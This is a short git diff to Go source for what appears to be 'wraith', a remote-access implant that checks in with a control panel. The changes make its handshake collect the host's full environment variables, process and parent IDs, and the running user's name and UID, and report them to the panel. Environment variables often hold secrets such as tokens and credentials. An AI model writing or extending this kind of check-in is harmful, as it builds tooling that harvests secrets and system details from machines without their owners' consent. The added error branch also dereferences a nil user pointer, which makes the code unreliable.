@@ -18,6 +18,7 @@ import (
 	mrand "math/rand"
 	"net/http"
 	"os"
+	"os/user"
 	"strings"
 	"sync"
 	"runtime"
@@ -402,7 +403,20 @@ func (wraith *wraithStruct) Handshake() error {
 	// Get required data
 	hostname, hostnameGetErr := os.Hostname()
 	if hostnameGetErr != nil {
-		hostname = "null"
+		hostname = "<null>"
+	}
+
+	env := os.Environ()
+
+	pid := os.Getpid()
+
+	ppid := os.Getppid()
+
+	runningUser, runningUserGetErr := user.Current()
+	if runningUserGetErr != nil {
+		*runningUser = user.User{}
+		runningUser.Name = "<null>"
+		runningUser.Uid = "<null>"
 	}
 
 	// Create data required by the panel for logging in
@@ -416,13 +430,14 @@ func (wraith *wraithStruct) Handshake() error {
 			"reportedIP": "",
 		},
 		"wraithInfo": map[string]interface{}{
-			"version":     "",
-			"startTime":   "",
+			"version":     wraithVersion,
+			"startTime":   WraithStartTime,
 			"plugins":     "",
-			"env":         "",
-			"pid":         "",
-			"ppid":        "",
-			"runningUser": "",
+			"env":         env,
+			"pid":         pid,
+			"ppid":        ppid,
+			"runningUserName": runningUser.Name,
+			"runningUserID": runningUser.Uid,
 		},
 	}
 
